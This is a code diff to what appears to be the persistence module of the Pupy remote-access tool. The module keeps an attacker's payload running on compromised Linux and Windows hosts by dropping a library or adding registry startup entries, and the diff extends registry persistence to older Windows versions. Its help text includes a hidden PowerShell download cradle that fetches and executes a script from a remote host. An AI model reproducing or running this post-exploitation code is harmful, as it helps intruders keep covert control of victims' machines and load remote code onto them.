@@ -27,8 +27,14 @@ __class_name__="PersistenceModule"
 @config(cat="manage", compat=['linux', 'windows'])
 class PersistenceModule(PupyModule):
     
-    """ Enables persistence via registry keys """
+    """ Enables persistence """
     
+    dependencies = {
+        'windows': [ 'pupwinutils.persistence' ],
+        'linux': [ 'persistence' ]
+    }
+
+
     def init_argparse(self):
         example = 'Examples:\n'
         example += '>> run persistence enable -c "powershell.exe -w hidden -noni -nop -c \\\"iex(New-Object System.Net.WebClient).DownloadString(\'http://192.168.0.15:8080/eiloShaegae1\')\\\""\n'
@@ -47,19 +53,25 @@ class PersistenceModule(PupyModule):
             self.linux(args)
 
     def linux(self, args):
-        self.client.load_package('persistence')
-        manager = self.client.conn.modules['persistence'].DropManager()
-        self.info('Available methods: {}'.format(manager.methods))
-        payload = get_payload(self, compressed=False)
-        drop_path, conf_path = manager.add_library(payload)
-        if drop_path and conf_path:
-            self.success('Dropped: {} Config: {}'.format(drop_path, conf_path))
-        else:
-            self.error('Couldn\'t make service persistent.')
+        
+        if args.action=="enable":
+            manager = self.client.conn.modules['persistence'].DropManager()
+            self.info('Available methods: {}'.format(manager.methods))
+            payload = get_payload(self, compressed=False)
+            drop_path, conf_path = manager.add_library(payload)
+            if drop_path and conf_path:
+                self.success('Dropped: {} Config: {}'.format(drop_path, conf_path))
+            else:
+                self.error('Couldn\'t make service persistent.')
+        
+        elif args.action=="disable":
+            # TO DO
+            self.warning('No yet implemented')
+            pass
+
 
     def windows(self, args):
         
-        self.client.load_package("pupwinutils.persistence")
         if args.action=="enable":
             cmd = ''
             exebuff=b""
@@ -97,8 +109,8 @@ class PersistenceModule(PupyModule):
                 self.success("a command line or an executable is needed")
                 return 
 
-            # adding persistency in registry
-            if self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System":
+            # adding persistency in registry (for xp, it will always be in registry)
+            if (self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System") or self.client.conn.modules['sys'].getwindowsversion()[0] < 6:
                 self.info("adding to registry ...")
                 if self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(cmd):
                     self.success("persistence added in registry !")
@@ -116,7 +128,7 @@ class PersistenceModule(PupyModule):
         elif args.action=="disable":
             
             # removing persistency from registry
-            if self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System":
+            if (self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System") or self.client.conn.modules['sys'].getwindowsversion()[0] < 6:
                 self.info("removing persistence from registry ...")
                 if self.client.conn.modules['pupwinutils.persistence'].remove_registry_startup():
                     self.info("persistence removed !")
